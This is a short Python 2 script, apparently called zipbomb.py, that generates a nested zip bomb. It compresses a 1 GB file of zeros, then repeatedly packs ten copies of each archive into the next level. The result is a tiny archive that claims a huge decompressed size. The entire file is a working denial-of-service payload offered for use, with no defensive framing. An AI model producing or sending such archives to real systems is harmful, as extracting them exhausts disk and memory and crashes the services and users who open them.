import zlib
import zipfile
import shutil
import os
import sys
import time

def fileSize(filename):
	st = os.stat(filename)
	return st.st_size

def makeTempFile(filename,size):
	with open(filename,'w') as dummy:
		for i in xrange(1024):
			dummy.write((size*1024*1024)*'0')

def filenameNoExt(name):
	return name[:name.rfind('.')]

def fileExt(name):
	return name[name.rfind('.')+1:]

def compressFile(infile,outfile):
	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
	zf.close()

def copyandcompress(infile, outfile, n_copies):
	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	for i in xrange(n_copies):
		f_name = '%s-%d.%s' % (filenameNoExt(infile),i,fileExt(infile))
		shutil.copy(infile,f_name)
		zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
		os.remove(f_name)
	zf.close()

if __name__ == '__main__':
	if len(sys.argv) < 3:
		print ('Usage:\n')
		print (' zipbomb.py n_levels out_zip_file')
		exit()
	n_levels = int(sys.argv[1])
	out_zip_file = sys.argv[2]
	dummy_name = 'dummy.txt'
	start_time = time.time()
	makeTempFile(dummy_name,1)
	level_1_zip = '1.zip'
	compressFile(dummy_name, level_1_zip)
	os.remove(dummy_name)
	decompressed_size = 1
	for i in xrange(1,n_levels+1):
		copyandcompress('%d.zip'%i,'%d.zip'%(i+1),10)
		decompressed_size *= 10
		os.remove('%d.zip'%i)
	if os.path.isfile(out_zip_file):
		os.remove(out_zip_file)
	os.rename('%d.zip'%(n_levels+1),out_zip_file)
	end_time = time.time()
	print ('Compressed File Size: %.2f KB'%(fileSize(out_zip_file)/1024.0))
	print ('Size After Decompression: %d GB'%decompressed_size)
	print ('Generation Time: %.2fs'%(end_time - start_time))